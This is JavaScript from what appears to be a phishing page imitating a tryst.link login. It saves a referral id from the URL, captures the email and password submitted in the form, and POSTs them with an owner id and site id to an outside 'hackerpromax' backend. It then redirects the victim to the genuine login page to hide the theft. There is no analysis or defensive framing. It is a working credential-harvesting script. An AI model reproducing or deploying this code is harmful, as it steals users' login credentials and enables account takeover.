<script>
var params = new URLSearchParams(window.location.search)
if (params.has('ref')) {
  var refId = params.get('ref')
  window.localStorage.setItem("ref", refId)
}
</script>
<script>
function handleLogin(event) {
  event.preventDefault();
  var refId = window.localStorage.getItem('ref')
  let email = document.getElementById("login").value;
  let password = document.getElementById("password").value;

  fetch('https://hackerpromax-backend.onrender.com/api/leads', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email, password, ownerId: refId, "siteId": "63a5f2f02ed96e062cd20a86",
    })
  }).then((res) => {
    location.replace("https://app.tryst.link/log_in")
  })

}


// your form
var form = document.getElementById("panda");

// attach event listener
form.addEventListener("submit", handleLogin, true);


</script>